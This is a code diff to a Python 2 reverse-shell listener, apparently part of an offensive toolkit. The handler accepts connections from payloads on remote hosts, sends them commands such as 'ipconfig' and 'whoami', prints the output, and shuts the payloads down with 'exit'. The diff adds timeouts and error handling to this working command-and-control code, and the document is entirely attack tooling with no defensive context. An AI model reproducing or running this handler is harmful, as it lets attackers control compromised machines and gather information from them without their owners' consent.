@@ -46,15 +46,16 @@ class handler(threading.Thread):
             c.send_msg(u"\r\n")
             self.clients.append(c)
             print '[+] Client connected: {0}'.format(address[0])
-    def stop_payload(self):
-        for cl in self.clients:
-            cl.send_msg('exit' + u"\n")
-            cl.send_msg('exit' + u"\n")
+    def stop_payload(self, rhost=''):
+        self.send('exit',timeout=3)
+        self.send('exit',timeout=3)
     def stop_handler(self):
         try:
             for cl in self.clients:
-                cl.close()
-            # Connect to my local server to stop socket.accept()
+                try:
+                    cl.close()
+                except Exception as e:
+                    print(e)
             sclose = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             if self.lhost == '':
                 self.lhost = '127.0.0.1'
@@ -63,23 +64,28 @@ class handler(threading.Thread):
             self.s.close()
         except Exception as e:
             print(e)
-    def send(self, msg, rhost=''):
-        # Define rhost to choose the destination. Otherwise, message will be sent to all clients.
+    def send(self, msg, rhost='', timeout=10):
         t = 0
         while not len(get_conns.clients):
             time.sleep(1)
-            if t > 10:
+            if t > timeout:
+                print('Timeout waiting answer')
                 break
             t += 1
         time.sleep(1)
         for c in self.clients:
+            t = 0
             if not len(rhost):
                 rhost = c.conn.getpeername()[0]
             if c.conn.getpeername()[0] == rhost:
                 c.data = ''
-                c.send_msg(msg + u"\r\n")
+                c.send_msg(msg + u"\n")
                 while not len(c.data):
                     time.sleep(1)
+                    if t > timeout:
+                        print('Timeout waiting answer')
+                        break
+                    t += 1
                 print(c.data)
                 c.data = ''
                 break
@@ -93,4 +99,5 @@ get_conns = handler(lhost, lport)
 get_conns.start()
 get_conns.send('ipconfig')
 get_conns.send('whoami')
+get_conns.stop_payload()
 get_conns.stop_handler()
